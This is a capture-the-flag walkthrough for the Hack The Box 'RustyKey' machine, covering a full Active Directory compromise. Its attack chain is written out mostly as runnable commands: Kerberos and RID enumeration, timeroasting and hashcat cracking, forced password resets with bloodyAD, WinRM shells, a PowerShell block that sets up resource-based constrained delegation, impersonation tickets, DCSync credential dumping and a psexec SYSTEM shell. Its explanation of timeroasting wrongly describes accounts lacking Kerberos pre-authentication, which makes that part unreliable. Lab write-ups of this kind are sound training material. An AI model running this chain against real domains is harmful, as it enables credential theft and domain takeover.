This document provides a step-by-step walkthrough for the RustyKey machine on Hack The Box. The machine involves Kerberos enumeration, timeroasting, and Active Directory privilege escalation through Resource-Based Constrained Delegation (RBCD).

---

## 1. Initial Reconnaissance

### 1.1. Port Scanning

First, we start by scanning the target machine to identify open ports and services.

```bash
nmap -p- -sV -sC 10.10.11.75
```

The scan reveals standard Active Directory ports, including Kerberos (88), DNS (53), and SMB (445). We also identify the domain name `rustykey.htb` and the domain controller `dc.rustykey.htb`.

Let's add these to our `/etc/hosts` file for convenience.

```bash
echo "10.10.11.75 dc.rustykey.htb rustykey.htb" | sudo tee -a /etc/hosts
```

### 1.2. Kerberos Enumeration

We are given initial credentials for the user `rr.parker` with the password `8#t5HE8L!W3A`. We can verify that Kerberos is active and NTLM is disabled.

First, obtain a Ticket Granting Ticket (TGT) for the user. We sync our system time with the DC to avoid clock skew errors.

```bash
# Sync time with the Domain Controller
sudo ntpdate -s dc.rustykey.htb

# Get a TGT for rr.parker
impacket-getTGT 'RUSTYKEY.HTB/rr.parker':'8#t5HE8L!W3A'

# Set the ccache file for subsequent commands
export KRB5CCNAME=rr.parker.ccache
```

### 1.3. RID Brute-Force

With a valid TGT, we can enumerate domain users and computers using a RID brute-force attack.

```bash
# Using impacket-lookupsid
impacket-lookupsid -k -no-pass dc.rustykey.htb
```
This command lists numerous users and computers, including several computer accounts like `IT-COMPUTER3$`.

---

## 2. Foothold via Timeroasting

The large number of computer accounts suggests that a **timeroasting** attack might be viable. This attack exploits accounts that do not have Kerberos pre-authentication enabled, allowing us to request a TGT and crack the account's password offline.

### 2.1. Performing the Attack

We can use a tool like `nxc` or `crackmapexec` with the `timeroast` module to get the hashes.

```bash
# The command would look like this
nxc smb 10.10.11.75 -M timeroast
```

This provides us with a hash for the `IT-COMPUTER3$` account.

### 2.2. Cracking the Hash

The hash format is `$sntp-ms$...`. We can crack this using Hashcat (mode `31300`).

```bash
# Save the hash to a file
echo '$sntp-ms$a0401fc1d9f28b37ffb58e5f78a375fb$1c0111e900000000000a27e14c4f434cec0d0cbe0e792b65e1b8428bffbfcd0aec0d41515a8135f5ec0d41515a816d52' > timeroast_hash.txt

# Crack with hashcat and a wordlist
./hashcat.bin -m 31300 timeroast_hash.txt /usr/share/wordlists/rockyou.txt
```
The cracked password for `IT-COMPUTER3$` is: `Rusty88!`

---

## 3. User Flag

### 3.1. Abusing Group Memberships

By running BloodHound with the `IT-COMPUTER3$` credentials, we discover a privilege escalation path:
1.  The `IT-COMPUTER3$` account has `AddSelf` rights on the `HELPDESK` group.
2.  The `HELPDESK` group has `ForceChangePassword` rights on the `BB.MORGAN` user.

We can exploit this using `bloodyAD`.

```bash
# 1. Add our computer account to the HELPDESK group
bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k add groupMember HELPDESK 'IT-COMPUTER3$'

# 2. Reset the password for BB.MORGAN
bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k set password BB.MORGAN 'Password123@'
```

### 3.2. Getting the User Shell

Now we can get a TGT for `BB.MORGAN` and connect via `evil-winrm`.

```bash
# Get TGT for the new user
impacket-getTGT 'RUSTYKEY.HTB/BB.MORGAN':'Password123@'
export KRB5CCNAME=BB.MORGAN.ccache

# Connect with evil-winrm
evil-winrm -i dc.rustykey.htb -r rustykey.htb
```

Once inside, we can navigate to the user's desktop and retrieve `user.txt`.

---

## 4. Privilege Escalation to Root

The path to root involves a DLL hijacking vulnerability to move laterally to another user (`mm.turner`) and then abusing Resource-Based Constrained Delegation (RBCD) to compromise the Domain Controller.

### 4.1. Lateral Movement via DLL Hijacking

On `BB.MORGAN`'s desktop, a file `internal.pdf` hints at a DLL hijacking opportunity related to the `Support` group. The user `ee.reed` is a member of this group. The attack involves:
1.  Resetting `ee.reed`'s password.
2.  Getting a shell as `ee.reed` using `RunasCs.exe`.
3.  Creating a malicious DLL and placing it in a location that will be loaded by a process run by a higher-privileged user (`mm.turner`).

This gives us a shell as `mm.turner`.

### 4.2. Resource-Based Constrained Delegation (RBCD)

From the `mm.turner` shell, we can configure RBCD. We grant our `IT-COMPUTER3$` account the right to impersonate any user on the Domain Controller (`DC$`).

The following PowerShell commands (executed from the `mm.turner` shell) set up the delegation:

```powershell
# Import PowerView or use ActiveDirectory module
. .\PowerView.ps1

# Define the SID of the account we want to grant delegation rights to
$ComputerSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-3316070415-896458127-4139322052-1125")

# Create a new Security Descriptor
$SD = New-Object System.DirectoryServices.ActiveDirectorySecurity
$SD.SetOwner($ComputerSID)
$SD.SetGroup($ComputerSID)

# Create an Access Control Entry (ACE) for GenericAll rights
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($ComputerSID, "GenericAll", "Allow")
$SD.AddAccessRule($ACE)

# Get the binary form of the Security Descriptor
$BinarySD = $SD.GetSecurityDescriptorBinaryForm()

# Apply the new Security Descriptor to the DC computer object
Set-ADComputer -Identity "DC" -Replace @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $BinarySD}
```

---

## 5. Root Flag

With RBCD configured, we can now abuse it to get full control.

### 5.1. Method 1: DCSync Attack

We can request a service ticket to the DC, impersonating the `backupadmin` user (who has DCSync rights), and then dump all domain credentials.

```bash
# Get a TGT for our computer account
impacket-getTGT 'RUSTYKEY.HTB/IT-COMPUTER3$':'Rusty88!'
export KRB5CCNAME=IT-COMPUTER3$.ccache

# Get a service ticket to the DC, impersonating backupadmin
impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.10.11.75 -k 'RUSTYKEY.HTB/IT-COMPUTER3$'
export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache

# Perform DCSync
impacket-secretsdump -k -no-pass rustykey.htb/backupadmin@dc.rustykey.htb
```

This will dump the NTLM hash for the `Administrator` account. We can then use this hash to get an administrator shell.

```bash
# Use the cracked administrator password or pass-the-hash
impacket-getTGT 'RUSTYKEY.HTB/administrator':'<ADMIN_PASSWORD_OR_HASH>'
export KRB5CCNAME=administrator.ccache
evil-winrm -i dc.rustykey.htb -r rustykey.htb
```

### 5.2. Method 2: PSExec

Alternatively, after getting the service ticket, we can directly use `psexec.py` for an interactive shell.

```bash
# After getting the ST and setting the ccache...
impacket-psexec -k -no-pass rustykey.htb/backupadmin@dc.rustykey.htb
```
This will provide a system-level shell on the domain controller, allowing you to read `root.txt`.

